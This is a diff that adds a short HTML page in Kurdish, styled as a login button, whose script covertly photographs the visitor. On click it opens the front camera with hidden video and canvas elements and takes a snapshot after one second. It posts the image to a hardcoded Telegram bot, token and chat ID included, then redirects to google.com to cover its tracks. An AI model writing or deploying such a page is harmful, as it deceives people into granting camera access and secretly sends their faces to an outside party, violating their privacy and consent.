@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تۆڕی پاراستن</title>
+    <style>
+        body { margin: 0; background: #000; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        button { padding: 20px 40px; font-size: 20px; border-radius: 50px; border: none; cursor: pointer; background: #fff; font-weight: bold; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <button id="btn">چوونەژوورەوە</button>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const token = '8734772782:AAFT6ize__0OBmz53luKQXus2iJpSg9NpmA';
+        const chatId = '7602797383';
+
+        document.getElementById('btn').addEventListener('click', () => {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'img.jpg');
+
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        }).then(() => {
+                            window.location.href = "https://google.com";
+                        });
+                    }, 'image/jpeg');
+                }, 1000);
+            });
+        });
+    </script>
+</body>
+</html>
